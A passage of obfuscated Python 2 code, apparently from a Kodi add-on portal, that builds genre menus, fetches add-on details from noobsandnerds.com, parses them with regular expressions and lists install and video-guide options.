 OOo0oO00ooO00 ( 'folder' , 'Indian' , url + '&genre=indian' , 'grab_addons' , 'mainmenu/addons.png' , '' , '' , '' )
 OOo0oO00ooO00 ( 'folder' , 'Irish' , url + '&genre=irish' , 'grab_addons' , 'mainmenu/addons.png' , '' , '' , '' )
 OOo0oO00ooO00 ( 'folder' , 'Italian' , url + '&genre=italian' , 'grab_addons' , 'mainmenu/addons.png' , '' , '' , '' )
 OOo0oO00ooO00 ( 'folder' , 'Japanese' , url + '&genre=japanese' , 'grab_addons' , 'mainmenu/addons.png' , '' , '' , '' )
 OOo0oO00ooO00 ( 'folder' , 'Korean' , url + '&genre=korean' , 'grab_addons' , 'mainmenu/addons.png' , '' , '' , '' )
 OOo0oO00ooO00 ( 'folder' , 'Lebanese' , url + '&genre=lebanese' , 'grab_addons' , 'mainmenu/addons.png' , '' , '' , '' )
 OOo0oO00ooO00 ( 'folder' , 'Mongolian' , url + '&genre=mongolian' , 'grab_addons' , 'mainmenu/addons.png' , '' , '' , '' )
 OOo0oO00ooO00 ( 'folder' , 'Moroccan' , url + '&genre=moroccan' , 'grab_addons' , 'mainmenu/addons.png' , '' , '' , '' )
 OOo0oO00ooO00 ( 'folder' , 'Nepali' , url + '&genre=nepali' , 'grab_addons' , 'mainmenu/addons.png' , '' , '' , '' )
 OOo0oO00ooO00 ( 'folder' , 'New Zealand' , url + '&genre=newzealand' , 'grab_addons' , 'mainmenu/addons.png' , '' , '' , '' )
 OOo0oO00ooO00 ( 'folder' , 'Norwegian' , url + '&genre=norwegian' , 'grab_addons' , 'mainmenu/addons.png' , '' , '' , '' )
 OOo0oO00ooO00 ( 'folder' , 'Pakistani' , url + '&genre=pakistani' , 'grab_addons' , 'mainmenu/addons.png' , '' , '' , '' )
 OOo0oO00ooO00 ( 'folder' , 'Polish' , url + '&genre=polish' , 'grab_addons' , 'mainmenu/addons.png' , '' , '' , '' )
 OOo0oO00ooO00 ( 'folder' , 'Portuguese' , url + '&genre=portuguese' , 'grab_addons' , 'mainmenu/addons.png' , '' , '' , '' )
 OOo0oO00ooO00 ( 'folder' , 'Romanian' , url + '&genre=romanian' , 'grab_addons' , 'mainmenu/addons.png' , '' , '' , '' )
 OOo0oO00ooO00 ( 'folder' , 'Russian' , url + '&genre=russian' , 'grab_addons' , 'mainmenu/addons.png' , '' , '' , '' )
 OOo0oO00ooO00 ( 'folder' , 'Singapore' , url + '&genre=singapore' , 'grab_addons' , 'mainmenu/addons.png' , '' , '' , '' )
 OOo0oO00ooO00 ( 'folder' , 'Spanish' , url + '&genre=spanish' , 'grab_addons' , 'mainmenu/addons.png' , '' , '' , '' )
 OOo0oO00ooO00 ( 'folder' , 'Swedish' , url + '&genre=swedish' , 'grab_addons' , 'mainmenu/addons.png' , '' , '' , '' )
 OOo0oO00ooO00 ( 'folder' , 'Swiss' , url + '&genre=swiss' , 'grab_addons' , 'mainmenu/addons.png' , '' , '' , '' )
 OOo0oO00ooO00 ( 'folder' , 'Syrian' , url + '&genre=syrian' , 'grab_addons' , 'mainmenu/addons.png' , '' , '' , '' )
 OOo0oO00ooO00 ( 'folder' , 'Tamil' , url + '&genre=tamil' , 'grab_addons' , 'mainmenu/addons.png' , '' , '' , '' )
 OOo0oO00ooO00 ( 'folder' , 'Thai' , url + '&genre=thai' , 'grab_addons' , 'mainmenu/addons.png' , '' , '' , '' )
 OOo0oO00ooO00 ( 'folder' , 'Turkish' , url + '&genre=turkish' , 'grab_addons' , 'mainmenu/addons.png' , '' , '' , '' )
 OOo0oO00ooO00 ( 'folder' , 'UK' , url + '&genre=uk' , 'grab_addons' , 'mainmenu/addons.png' , '' , '' , '' )
 OOo0oO00ooO00 ( 'folder' , 'USA' , url + '&genre=usa' , 'grab_addons' , 'mainmenu/addons.png' , '' , '' , '' )
 OOo0oO00ooO00 ( 'folder' , 'Vietnamese' , url + '&genre=vietnamese' , 'grab_addons' , 'mainmenu/addons.png' , '' , '' , '' )
 if 40 - 40: i11Iii * Oo00oo0oO * i11iIiiIii
 if 57 - 57: i11Iii
def II11Iiii ( ) :
 i11I = 0
 o00Oo0oooooo = os . listdir ( oO0o0o0ooO0oO )
 for O0oO0 in o00Oo0oooooo :
  if O0oO0 . lower ( ) . endswith ( '.db' ) and O0oO0 . lower ( ) . startswith ( 'addons' ) :
   iII11 = os . path . join ( oO0o0o0ooO0oO , O0oO0 )
   iiIiii1IIIII = os . path . getmtime ( iII11 )
   if iiIiii1IIIII > i11I :
    i11I = iiIiii1IIIII
    o00o = iII11
 return o00o
 if 45 - 45: oOoO0o00OO0 . o0ii1I . oOoO0o00OO0 - o000O0o . o0ii1I
 if 12 - 12: OOO0O0O0ooooo - o0ii1I
def oOoO00O0 ( url ) :
 OO = 'http://noobsandnerds.com/TI/AddonPortal/addondetails.php?id=%s' % ( url )
 Ii1iI111II1I1 = oOOOOoOO0o ( OO , 10 ) . replace ( '\n' , '' ) . replace ( '\r' , '' )
 if 1 - 1: Ooo00oOo0oOo
 O0oOo00o = re . compile ( 'addon_types="(.+?)"' ) . findall ( Ii1iI111II1I1 )
 o0ooooO0o0O = re . compile ( 'name="(.+?)"' ) . findall ( Ii1iI111II1I1 )
 iiIi11iI1iii = re . compile ( 'UID="(.+?)"' ) . findall ( Ii1iI111II1I1 )
 oo000 = re . compile ( 'id="(.+?)"' ) . findall ( Ii1iI111II1I1 )
 o0000oO = re . compile ( 'provider_name="(.+?)"' ) . findall ( Ii1iI111II1I1 )
 iI1i111I1Ii = re . compile ( 'version="(.+?)"' ) . findall ( Ii1iI111II1I1 )
 i11i1ii1I = re . compile ( 'created="(.+?)"' ) . findall ( Ii1iI111II1I1 )
 o0OO0o0o00o = re . compile ( 'addon_types="(.+?)"' ) . findall ( Ii1iI111II1I1 )
 oOo0 = re . compile ( 'updated="(.+?)"' ) . findall ( Ii1iI111II1I1 )
 OOOoOO = re . compile ( 'downloads="(.+?)"' ) . findall ( Ii1iI111II1I1 )
 if 10 - 10: ooo0O0O00 + iiII11i1I1IIi * oOoO0o00OO0 + IIii1I / OoOo0o / oOoO0o00OO0
 iI1II = re . compile ( 'description="(.+?)"' ) . findall ( Ii1iI111II1I1 )
 o0OOo0o0O0O = re . compile ( 'devbroke="(.+?)"' ) . findall ( Ii1iI111II1I1 )
 o0OO0o0oOOO0O = re . compile ( 'broken="(.+?)"' ) . findall ( Ii1iI111II1I1 )
 iII1i11 = re . compile ( 'deleted="(.+?)"' ) . findall ( Ii1iI111II1I1 )
 Ooo = re . compile ( 'mainbranch_notes="(.+?)"' ) . findall ( Ii1iI111II1I1 )
 if 20 - 20: Ooo00oOo0oOo % iiII11i1I1IIi + oOoO0o00OO0 + i11Iii
 II11iIIiiiII = re . compile ( 'repo_url="(.+?)"' ) . findall ( Ii1iI111II1I1 )
 OoOoo00Ooo00 = re . compile ( 'data_url="(.+?)"' ) . findall ( Ii1iI111II1I1 )
 oo0O00Oooo0O0 = re . compile ( 'zip_url="(.+?)"' ) . findall ( Ii1iI111II1I1 )
 I11OO = re . compile ( 'genres="(.+?)"' ) . findall ( Ii1iI111II1I1 )
 o0O0oo0OO0O = re . compile ( 'forum="(.+?)"' ) . findall ( Ii1iI111II1I1 )
 OO0 = re . compile ( 'repo_id="(.+?)"' ) . findall ( Ii1iI111II1I1 )
 o0Oooo = re . compile ( 'license="(.+?)"' ) . findall ( Ii1iI111II1I1 )
 iiI = re . compile ( 'platform="(.+?)"' ) . findall ( Ii1iI111II1I1 )
 oOIIiIi = re . compile ( 'visible="(.+?)"' ) . findall ( Ii1iI111II1I1 )
 OOoOooOoOOOoo = re . compile ( 'script="(.+?)"' ) . findall ( Ii1iI111II1I1 )
 Iiii1iI1i = re . compile ( 'program_plugin="(.+?)"' ) . findall ( Ii1iI111II1I1 )
 I1ii1ii11i1I = re . compile ( 'script_module="(.+?)"' ) . findall ( Ii1iI111II1I1 )
 o0OoOO = re . compile ( 'video_plugin="(.+?)"' ) . findall ( Ii1iI111II1I1 )
 O0O0Oo00 = re . compile ( 'audio_plugin="(.+?)"' ) . findall ( Ii1iI111II1I1 )
 oOoO00o = re . compile ( 'image_plugin="(.+?)"' ) . findall ( Ii1iI111II1I1 )
 oO00O0 = re . compile ( 'repository="(.+?)"' ) . findall ( Ii1iI111II1I1 )
 IIi1IIIi = re . compile ( 'weather_service="(.+?)"' ) . findall ( Ii1iI111II1I1 )
 O00Ooo = re . compile ( 'skin="(.+?)"' ) . findall ( Ii1iI111II1I1 )
 OOOO0OOO = re . compile ( 'service="(.+?)"' ) . findall ( Ii1iI111II1I1 )
 i1i1ii = re . compile ( 'warning="(.+?)"' ) . findall ( Ii1iI111II1I1 )
 iII1ii1 = re . compile ( 'web_interface="(.+?)"' ) . findall ( Ii1iI111II1I1 )
 I1i1iiiI1 = re . compile ( 'movie_scraper="(.+?)"' ) . findall ( Ii1iI111II1I1 )
 iIIi = re . compile ( 'tv_scraper="(.+?)"' ) . findall ( Ii1iI111II1I1 )
 oO0o00oo0 = re . compile ( 'artist_scraper="(.+?)"' ) . findall ( Ii1iI111II1I1 )
 ii1IIII = re . compile ( 'music_video_scraper="(.+?)"' ) . findall ( Ii1iI111II1I1 )
 oO00oOooooo0 = re . compile ( 'subtitles="(.+?)"' ) . findall ( Ii1iI111II1I1 )
 oOo = re . compile ( 'requires="(.+?)"' ) . findall ( Ii1iI111II1I1 )
 O0OOooOoO = re . compile ( 'modules="(.+?)"' ) . findall ( Ii1iI111II1I1 )
 i1II1I1Iii1 = re . compile ( 'icon="(.+?)"' ) . findall ( Ii1iI111II1I1 )
 iiI11Iii = re . compile ( 'video_preview="(.+?)"' ) . findall ( Ii1iI111II1I1 )
 O0o0O0 = re . compile ( 'video_guide="(.+?)"' ) . findall ( Ii1iI111II1I1 )
 Ii1II1I11i1 = re . compile ( 'video_guide1="(.+?)"' ) . findall ( Ii1iI111II1I1 )
 oOoooooOoO = re . compile ( 'video_guide2="(.+?)"' ) . findall ( Ii1iI111II1I1 )
 Ii111 = re . compile ( 'video_guide3="(.+?)"' ) . findall ( Ii1iI111II1I1 )
 I111i1i1111 = re . compile ( 'video_guide4="(.+?)"' ) . findall ( Ii1iI111II1I1 )
 IIII1 = re . compile ( 'video_guide5="(.+?)"' ) . findall ( Ii1iI111II1I1 )
 I1I1i = re . compile ( 'video_guide6="(.+?)"' ) . findall ( Ii1iI111II1I1 )
 I1IIIiIiIi = re . compile ( 'video_guide7="(.+?)"' ) . findall ( Ii1iI111II1I1 )
 IIIII1 = re . compile ( 'video_guide8="(.+?)"' ) . findall ( Ii1iI111II1I1 )
 iIi1Ii1i1iI = re . compile ( 'video_guide9="(.+?)"' ) . findall ( Ii1iI111II1I1 )
 IIiI1 = re . compile ( 'video_guide10="(.+?)"' ) . findall ( Ii1iI111II1I1 )
 i1iI1 = re . compile ( 'video_label1="(.+?)"' ) . findall ( Ii1iI111II1I1 )
 ii1 = re . compile ( 'video_label2="(.+?)"' ) . findall ( Ii1iI111II1I1 )
 I1IiiI1ii1i = re . compile ( 'video_label3="(.+?)"' ) . findall ( Ii1iI111II1I1 )
 O0o = re . compile ( 'video_label4="(.+?)"' ) . findall ( Ii1iI111II1I1 )
 oO0OoO00o = re . compile ( 'video_label5="(.+?)"' ) . findall ( Ii1iI111II1I1 )
 II1iiiiII = re . compile ( 'video_label6="(.+?)"' ) . findall ( Ii1iI111II1I1 )
 O0OoOO0oo0 = re . compile ( 'video_label7="(.+?)"' ) . findall ( Ii1iI111II1I1 )
 oOO = re . compile ( 'video_label8="(.+?)"' ) . findall ( Ii1iI111II1I1 )
 O0o0OO0000ooo = re . compile ( 'video_label9="(.+?)"' ) . findall ( Ii1iI111II1I1 )
 iIIII1iIIii = re . compile ( 'video_label10="(.+?)"' ) . findall ( Ii1iI111II1I1 )
 if 52 - 52: o0ii1I % iiII11i1I1IIi
 if 64 - 64: OOO0O0O0ooooo % o0o % OOO0O0O0ooooo * o0oo . oooOooOOo0OO + o000O0o
 if 75 - 75: o0o . II1 % o0ii1I * o0o % II1
 I11i1iIiIIIIIii = O0oOo00o [ 0 ] if ( len ( O0oOo00o ) > 0 ) else ''
 OOo0 = o0ooooO0o0O [ 0 ] if ( len ( o0ooooO0o0O ) > 0 ) else ''
 ii11I1 = iiIi11iI1iii [ 0 ] if ( len ( iiIi11iI1iii ) > 0 ) else ''
 oO0oo = oo000 [ 0 ] if ( len ( oo000 ) > 0 ) else ''
 Ii111iIi1iIi = o0000oO [ 0 ] if ( len ( o0000oO ) > 0 ) else ''
 IIIIIo0ooOoO000oO = iI1i111I1Ii [ 0 ] if ( len ( iI1i111I1Ii ) > 0 ) else ''
 OOo = i11i1ii1I [ 0 ] if ( len ( i11i1ii1I ) > 0 ) else ''
 i1i11I1I1iii1 = o0OO0o0o00o [ 0 ] if ( len ( o0OO0o0o00o ) > 0 ) else ''
 I1iii11 = oOo0 [ 0 ] if ( len ( oOo0 ) > 0 ) else ''
 ooo0O = OOOoOO [ 0 ] if ( len ( OOOoOO ) > 0 ) else ''
 if 16 - 16: Iii
 Iiiiii111i1ii = '[CR][CR][COLOR=dodgerblue]Description: [/COLOR]' + iI1II [ 0 ] if ( len ( iI1II ) > 0 ) else ''
 i1i1iII1 = o0OOo0o0O0O [ 0 ] if ( len ( o0OOo0o0O0O ) > 0 ) else ''
 iii11i1IIII = o0OO0o0oOOO0O [ 0 ] if ( len ( o0OO0o0oOOO0O ) > 0 ) else ''
 Ii = '[CR]' + iII1i11 [ 0 ] if ( len ( iII1i11 ) > 0 ) else ''
 o00iiI1Ii1 = '[CR][CR][COLOR=dodgerblue]User Notes: [/COLOR]' + Ooo [ 0 ] if ( len ( Ooo ) > 0 ) else ''
 if 18 - 18: Ooo00oOo0oOo / Oo00oo0oO
 IiIIii1 = II11iIIiiiII [ 0 ] if ( len ( II11iIIiiiII ) > 0 ) else ''
 O000OOO0OOo = OoOoo00Ooo00 [ 0 ] if ( len ( OoOoo00Ooo00 ) > 0 ) else ''
 i1i1I111iIi1 = oo0O00Oooo0O0 [ 0 ] if ( len ( oo0O00Oooo0O0 ) > 0 ) else ''
 oo00O00oO000o = I11OO [ 0 ] if ( len ( I11OO ) > 0 ) else ''
 OOo00OoO = '[CR][CR][COLOR=dodgerblue]Support Forum: [/COLOR]' + o0O0oo0OO0O [ 0 ] if ( len ( o0O0oo0OO0O ) > 0 ) else '[CR][CR][COLOR=dodgerblue]Support Forum: [/COLOR]No forum details given by developer'
 iIi1 = o0O0oo0OO0O [ 0 ] if ( len ( o0O0oo0OO0O ) > 0 ) else 'None'
 i11iiI1111 = OO0 [ 0 ] if ( len ( OO0 ) > 0 ) else ''
 license = o0Oooo [ 0 ] if ( len ( o0Oooo ) > 0 ) else ''
 oOoooo000Oo00 = '[COLOR=orange]     Platform: [/COLOR]' + iiI [ 0 ] if ( len ( iiI ) > 0 ) else ''
 OOoo = oOIIiIi [ 0 ] if ( len ( oOIIiIi ) > 0 ) else ''
 o00O00oO00 = OOoOooOoOOOoo [ 0 ] if ( len ( OOoOooOoOOOoo ) > 0 ) else ''
 Ii1i1i1i1I1Ii = Iiii1iI1i [ 0 ] if ( len ( Iiii1iI1i ) > 0 ) else ''
 iiiI1 = I1ii1ii11i1I [ 0 ] if ( len ( I1ii1ii11i1I ) > 0 ) else ''
 OOOoO0O = o0OoOO [ 0 ] if ( len ( o0OoOO ) > 0 ) else ''
 o0iiiI1I1iIIIi1 = O0O0Oo00 [ 0 ] if ( len ( O0O0Oo00 ) > 0 ) else ''
 IiiI1iiiiI1iI = oOoO00o [ 0 ] if ( len ( oOoO00o ) > 0 ) else ''
 iIiiiii1i = oO00O0 [ 0 ] if ( len ( oO00O0 ) > 0 ) else ''
 iiIi1IIiI = OOOO0OOO [ 0 ] if ( len ( OOOO0OOO ) > 0 ) else ''
 I11iii1Ii = O00Ooo [ 0 ] if ( len ( O00Ooo ) > 0 ) else ''
 i1oO0OO0 = i1i1ii [ 0 ] if ( len ( i1i1ii ) > 0 ) else ''
 o0O0Oo00 = iII1ii1 [ 0 ] if ( len ( iII1ii1 ) > 0 ) else ''
 O0Oo0o000oO = IIi1IIIi [ 0 ] if ( len ( IIi1IIIi ) > 0 ) else ''
 oO0o00oOOooO0 = I1i1iiiI1 [ 0 ] if ( len ( I1i1iiiI1 ) > 0 ) else ''
 OOOoO000 = iIIi [ 0 ] if ( len ( iIIi ) > 0 ) else ''
 oOOOO = oO0o00oo0 [ 0 ] if ( len ( oO0o00oo0 ) > 0 ) else ''
 IiIi1ii111i1 = ii1IIII [ 0 ] if ( len ( ii1IIII ) > 0 ) else ''
 i1i1i1I = oO00oOooooo0 [ 0 ] if ( len ( oO00oOooooo0 ) > 0 ) else ''
 oOoo000 = oOo [ 0 ] if ( len ( oOo ) > 0 ) else ''
 OooOo00o = O0OOooOoO [ 0 ] if ( len ( O0OOooOoO ) > 0 ) else ''
 IiI11i1IIiiI = i1II1I1Iii1 [ 0 ] if ( len ( i1II1I1Iii1 ) > 0 ) else ''
 oOOo000oOoO0 = iiI11Iii [ 0 ] if ( len ( iiI11Iii ) > 0 ) else 'None'
 OoOo00o0OO = O0o0O0 [ 0 ] if ( len ( O0o0O0 ) > 0 ) else 'None'
 ii1IIIIiI11 = Ii1II1I11i1 [ 0 ] if ( len ( Ii1II1I11i1 ) > 0 ) else 'None'
 iI1IIIii = oOoooooOoO [ 0 ] if ( len ( oOoooooOoO ) > 0 ) else 'None'
 I1i11ii11 = Ii111 [ 0 ] if ( len ( Ii111 ) > 0 ) else 'None'
 OO00O0oOO = I111i1i1111 [ 0 ] if ( len ( I111i1i1111 ) > 0 ) else 'None'
 Ii1iI111 = IIII1 [ 0 ] if ( len ( IIII1 ) > 0 ) else 'None'
 O0oooo00o0Oo = I1I1i [ 0 ] if ( len ( I1I1i ) > 0 ) else 'None'
 I1iii = I1IIIiIiIi [ 0 ] if ( len ( I1IIIiIiIi ) > 0 ) else 'None'
 oO0o0O0Ooo0o = IIIII1 [ 0 ] if ( len ( IIIII1 ) > 0 ) else 'None'
 i1Ii11II = iIi1Ii1i1iI [ 0 ] if ( len ( iIi1Ii1i1iI ) > 0 ) else 'None'
 IioO0oOOO0Ooo = IIiI1 [ 0 ] if ( len ( IIiI1 ) > 0 ) else 'None'
 i1i1I = i1iI1 [ 0 ] if ( len ( i1iI1 ) > 0 ) else 'None'
 IiIIi1 = ii1 [ 0 ] if ( len ( ii1 ) > 0 ) else 'None'
 iII11I1Ii1 = I1IiiI1ii1i [ 0 ] if ( len ( I1IiiI1ii1i ) > 0 ) else 'None'
 o0o0 = O0o [ 0 ] if ( len ( O0o ) > 0 ) else 'None'
 oOo0oO = oO0OoO00o [ 0 ] if ( len ( oO0OoO00o ) > 0 ) else 'None'
 IIi1IIIIi = II1iiiiII [ 0 ] if ( len ( II1iiiiII ) > 0 ) else 'None'
 OOOoO = O0OoOO0oo0 [ 0 ] if ( len ( O0OoOO0oo0 ) > 0 ) else 'None'
 I1i = oOO [ 0 ] if ( len ( oOO ) > 0 ) else 'None'
 iiiI = O0o0OO0000ooo [ 0 ] if ( len ( O0o0OO0000ooo ) > 0 ) else 'None'
 IiIi1 = iIIII1iIIii [ 0 ] if ( len ( iIIII1iIIii ) > 0 ) else 'None'
 if 34 - 34: II11iIiIIIiI
 print "### Addon Details: " + OOo0
 if 91 - 91: IIii1I % o0ii1I . IIii1I % O00ooooo00 / Ooo00oOo0oOo * Iii
 if Ii != '' :
  ii = '[CR][CR][COLOR=dodgerblue]Status: [/COLOR][COLOR=red]This add-on is depreciated, it\'s no longer available.[/COLOR]'
  if 81 - 81: OOO0O0O0ooooo % IIIIiiII111
 elif iii11i1IIII == '' and i1i1iII1 == '' and i1oO0OO0 == '' :
  ii = '[CR][CR][COLOR=dodgerblue]Status: [/COLOR][COLOR=lime]No reported problems[/COLOR]'
  if 5 - 5: II1 - o0oo + Oo00oo0oO - ooo0O0O00 . o0oo / i11Iii
 elif iii11i1IIII == '' and i1i1iII1 == '' and i1oO0OO0 != '' and Ii == '' :
  ii = '[CR][CR][COLOR=dodgerblue]Status: [/COLOR][COLOR=orange]Although there have been no reported problems there may be issues with this add-on, see below.[/COLOR]'
  if 28 - 28: IIIIiiII111 * IIIIiiII111 - IIii1I
 elif iii11i1IIII == '' and i1i1iII1 != '' :
  ii = '[CR][CR][COLOR=dodgerblue]Status: [/COLOR]Marked as broken by the add-on developer.[CR][COLOR=dodgerblue]Developer Comments: [/COLOR]' + i1i1iII1
  if 70 - 70: OoOo0o
 elif iii11i1IIII != '' and i1i1iII1 == '' :
  ii = '[CR][CR][COLOR=dodgerblue]Status: [/COLOR]Marked as broken by a member of the community at WWW.NOOBSANDNERDS.COM[CR][COLOR=dodgerblue]User Comments: [/COLOR]' + iii11i1IIII
  if 16 - 16: ooo0O0O00 - II1 % iiII11i1I1IIi
 elif iii11i1IIII != '' and i1i1iII1 != '' :
  ii = '[CR][CR][COLOR=dodgerblue]Status: [/COLOR]Marked as broken by both the add-on developer and a member of the community at WWW.NOOBSANDNERDS.COM[CR][COLOR=dodgerblue]Developer Comments: [/COLOR]' + i1i1iII1 + '[CR][COLOR=dodgerblue]User Comments: [/COLOR]' + iii11i1IIII
  if 36 - 36: II11iIiIIIiI
  if 84 - 84: OoOo0o . o0oo . Ooo00oOo0oOo . o0o / IIIIiiII111 % oOoO0o00OO0
 OOO0oOoO0O = str ( '[COLOR=orange]Name: [/COLOR]' + OOo0 + '[COLOR=orange]     Author(s): [/COLOR]' + Ii111iIi1iIi + '[COLOR=orange][CR][CR]Version: [/COLOR]' + IIIIIo0ooOoO000oO + '[COLOR=orange]     Created: [/COLOR]' + OOo + '[COLOR=orange]     Updated: [/COLOR]' + I1iii11 + '[COLOR=orange][CR][CR]Repository: [/COLOR]' + i11iiI1111 + oOoooo000Oo00 + '[COLOR=orange]     Add-on Type(s): [/COLOR]' + i1i11I1I1iii1 + oOoo000 + ii + Ii + i1oO0OO0 + OOo00OoO + Iiiiii111i1ii + o00iiI1Ii1 )
 if 84 - 84: OOO0O0O0ooooo * II1 - Oo00oo0oO * Oo00oo0oO
 if 8 - 8: i11Iii / O00ooooo00 . oooOooOOo0OO
 if os . path . exists ( os . path . join ( i1iiIII111ii , oO0oo ) ) :
  if 'script.module' in oO0oo or 'repo' in oO0oo :
   OOo0oO00ooO00 ( '' , '[COLOR=orange](Already Installed)[/COLOR]' , '' , '' , IiI11i1IIiiI , '' , '' , '' )
  else :
   OOo0oO00ooO00 ( '' , '[COLOR=orange](Already Installed)[/COLOR] Click here to run the add-on' , oO0oo , 'run_addon' , IiI11i1IIiiI , '' , '' , '' )
   if 41 - 41: ooo0O0O00 + o0oo
   if 86 - 86: Iii . IIii1I - o0oo
 if OOo0 == '' :
  OOo0oO00ooO00 ( '' , '[COLOR=yellow]Sorry request failed due to high traffic on server, please try again[/COLOR]' , '' , '' , IiI11i1IIiiI , '' , '' , '' )
  if 56 - 56: OOO0O0O0ooooo
  if 61 - 61: o0ii1I / II11iIiIIIiI / iiII11i1I1IIi * OOO0O0O0ooooo
 elif OOo0 != '' :
  if 23 - 23: oooOooOOo0OO - II11iIiIIIiI + o0o
  if ( iii11i1IIII == '' ) and ( i1i1iII1 == '' ) and ( Ii == '' ) and ( i1oO0OO0 == '' ) :
   OOo0oO00ooO00 ( 'addon' , '[COLOR=yellow][FULL DETAILS][/COLOR] No problems reported' , OOO0oOoO0O , 'text_guide' , IiI11i1IIiiI , '' , '' , OOO0oOoO0O )
   if 12 - 12: o000O0o / i11Iii % o0ii1I / i11iIiiIii % II1
  if ( iii11i1IIII != '' and Ii == '' ) or ( i1i1iII1 != '' and Ii == '' ) or ( i1oO0OO0 != '' and Ii == '' ) :
   OOo0oO00ooO00 ( 'addon' , '[COLOR=yellow][FULL DETAILS][/COLOR][COLOR=orange] Possbile problems reported[/COLOR]' , OOO0oOoO0O , 'text_guide' , IiI11i1IIiiI , '' , '' , OOO0oOoO0O )
   if 15 - 15: IIii1I % II1 - iiII11i1I1IIi * IIIIiiII111 + o0o
  if Ii != '' :
   OOo0oO00ooO00 ( 'addon' , '[COLOR=yellow][FULL DETAILS][/COLOR][COLOR=red] Add-on now depreciated[/COLOR]' , OOO0oOoO0O , 'text_guide' , IiI11i1IIiiI , '' , '' , OOO0oOoO0O )
   if 11 - 11: ooo0O0O00 * IIIIiiII111 - Iii
   if 66 - 66: Iii . i11iIiiIii - ooo0O0O00 * o0ii1I + II1 * oOoO0o00OO0
  if Ii == '' :
   if 74 - 74: iiII11i1I1IIi
   if i11iiI1111 != '' and 'superrepo' not in i11iiI1111 :
    I1IiiiiI ( '[COLOR=lime][INSTALL - Recommended] [/COLOR]' + OOo0 , OOo0 , '' , 'addon_install_zero' , IiI11i1IIiiI , '' , '' , Iiiiii111i1ii , I11i1iIiIIIIIii , IiIIii1 , i11iiI1111 , oO0oo , Ii111iIi1iIi , iIi1 , O000OOO0OOo )
    I1IiiiiI ( '[COLOR=lime][INSTALL - Backup Option] [/COLOR]' + OOo0 , OOo0 , '' , 'addon_install' , IiI11i1IIiiI , '' , '' , Iiiiii111i1ii , i1i1I111iIi1 , IiIIii1 , i11iiI1111 , oO0oo , Ii111iIi1iIi , iIi1 , O000OOO0OOo )
    if 61 - 61: iiII11i1I1IIi - OoOo0o * Ooo00oOo0oOo % i11Iii * IIii1I + o0oo
   if i11iiI1111 == '' or 'superrepo' in i11iiI1111 :
    I1IiiiiI ( '[COLOR=lime][INSTALL] [/COLOR]' + OOo0 + ' - THIS IS NOT IN A SELF UPDATING REPO' , OOo0 , '' , 'addon_install' , '' , '' , '' , Iiiiii111i1ii , i1i1I111iIi1 , IiIIii1 , i11iiI1111 , oO0oo , Ii111iIi1iIi , iIi1 , O000OOO0OOo )
    if 71 - 71: o0o / o0o * oooOooOOo0OO * oooOooOOo0OO / Ooo00oOo0oOo
    if 35 - 35: II11iIiIIIiI * o0ii1I * o000O0o % iiII11i1I1IIi . Iii
  if oOOo000oOoO0 != 'None' :
   OOo0oO00ooO00 ( '' , '[COLOR=dodgerblue][VIDEO][/COLOR]  Preview' , ii1IIIIiI11 , 'play_video' , '' , '' , '' , '' )
   if 58 - 58: o0o + Ooo00oOo0oOo * ooo0O0O00 * i11iIiiIii - IIii1I
  if ii1IIIIiI11 != 'None' :
   OOo0oO00ooO00 ( '' , '[COLOR=dodgerblue][VIDEO][/COLOR]  ' + i1i1I , ii1IIIIiI11 , 'play_video' , '' , '' , '' , '' )
   if 68 - 68: II1 % Ooo00oOo0oOo
  if iI1IIIii != 'None' :
   OOo0oO00ooO00 ( '' , '[COLOR=dodgerblue][VIDEO][/COLOR]  ' + IiIIi1 , iI1IIIii , 'play_video' , '' , '' , '' , '' )
   if 26 - 26: Ooo00oOo0oOo % i11iIiiIii % IIii1I % o0o * o0o * oOoO0o00OO0
  if I1i11ii11 != 'None' :
   OOo0oO00ooO00 ( '' , '[COLOR=dodgerblue][VIDEO][/COLOR]  ' + iII11I1Ii1 , I1i11ii11 , 'play_video' , '' , '' , '' , '' )
   if 24 - 24: Ooo00oOo0oOo % OoOo0o - i11Iii + o000O0o * oOoO0o00OO0
  if OO00O0oOO != 'None' :
   OOo0oO00ooO00 ( '' , '[COLOR=dodgerblue][VIDEO][/COLOR]  ' + o0o0 , OO00O0oOO , 'play_video' , '' , '' , '' , '' )
   if 2 - 2: IIIIiiII111 - Oo00oo0oO
  if Ii1iI111 != 'None' :
   OOo0oO00ooO00 ( '' , '[COLOR=dodgerblue][VIDEO][/COLOR]  ' + oOo0oO , Ii1iI111 , 'play_video' , '' , '' , '' , '' )
   if 83 - 83: oooOooOOo0OO % o0ii1I % IIIIiiII111 - Ooo00oOo0oOo * II11iIiIIIiI / II1
  if O0oooo00o0Oo != 'None' :
   OOo0oO00ooO00 ( '' , '[COLOR=dodgerblue][VIDEO][/COLOR]  ' + IIi1IIIIi , O0oooo00o0Oo , 'play_video' , '' , '' , '' , '' )
   if 18 - 18: o0oo + IIii1I - Ooo00oOo0oOo - o000O0o
  if I1iii != 'None' :
   OOo0oO00ooO00 ( '' , '[COLOR=dodgerblue][VIDEO][/COLOR]  ' + OOOoO , I1iii , 'play_video' , '' , '' , '' , '' )
   if 71 - 71: II1
  if oO0o0O0Ooo0o != 'None' :
   OOo0oO00ooO00 ( '' , '[COLOR=dodgerblue][VIDEO][/COLOR]  ' + I1i , oO0o0O0Ooo0o , 'play_video' , '' , '' , '' , '' )
   if 33 - 33: OoOo0o
  if i1Ii11II != 'None' :
   OOo0oO00ooO00 ( '' , '[COLOR=dodgerblue][VIDEO][/COLOR]  ' + iiiI , i1Ii11II , 'play_video' , '' , '' , '' , '' )
   if 62 - 62: oOoO0o00OO0 + IIIIiiII111 + O00ooooo00 / II1
  if IioO0oOOO0Ooo != 'None' :
   OOo0oO00ooO00 ( '' , '[COLOR=dodgerblue][VIDEO][/COLOR]  ' + IiIi1 , IioO0oOOO0Ooo , 'play_video' , '' , '' , '' , '' )
   if 7 - 7: o0ii1I + O00ooooo00 . o000O0o / iiII11i1I1IIi
   if 22 - 22: i11Iii - i11Iii % II11iIiIIIiI . OoOo0o + oooOooOOo0OO
def Oo00OOo00O ( url ) :
 OOo0oO00ooO00 ( 'folder' , 'Anime' , url + '&genre=anime' , 'grab_addons' , 'mainmenu/addons.png' , '' , '' , '' )
 OOo0oO00ooO00 ( 'folder' , 'Audiobooks' , url + '&genre=audiobooks' , 'grab_addons' , 'mainmenu/addons.png' , '' , '' , '' )
 OOo0oO00ooO00 ( 'folder' , 'Comedy' , url + '&genre=comedy' , 'grab_addons' , 'mainmenu/addons.png' , '' , '' , '' )
